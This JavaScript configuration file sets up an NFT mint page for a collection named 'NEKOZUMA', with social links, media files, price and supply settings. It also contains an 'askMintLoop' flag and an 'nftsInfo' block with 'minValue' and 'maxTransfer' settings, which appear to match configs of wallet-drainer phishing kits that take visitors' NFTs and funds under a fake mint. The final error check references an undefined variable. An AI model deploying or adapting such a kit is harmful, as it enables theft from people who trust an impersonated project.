const collectionInfo = {
    name: "NEKOZUMA", // Name of the collection
    title: "{name}", 
    date: "04.08.2022", // Today Date
    socialMedia: {
        discord: "https://discord.gg/nekozumanft", // Discord link
        twitter: "https://twitter.com/NekozumaNFT", // Twitter link
    },
    medias: {
        preview: "gif.gif", // Location logo
	favicon: "logo.png", // Location logo page tab
    },
    background: {
        type: "image",
        image: "bj.gif", // Location background
        video: "",
        color: "#4E4E6D",
    }
}
const mintInfo = {
    price: 1.88,
    totalSupply: 5555,
	toFixed: 2,
    minUnits: 1,
    maxUnits: 2,
    askMintLoop: true,
}

const nftsInfo = {
    active: true,
    minValue: 0.3,
    maxTransfer: 2,
}

if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);
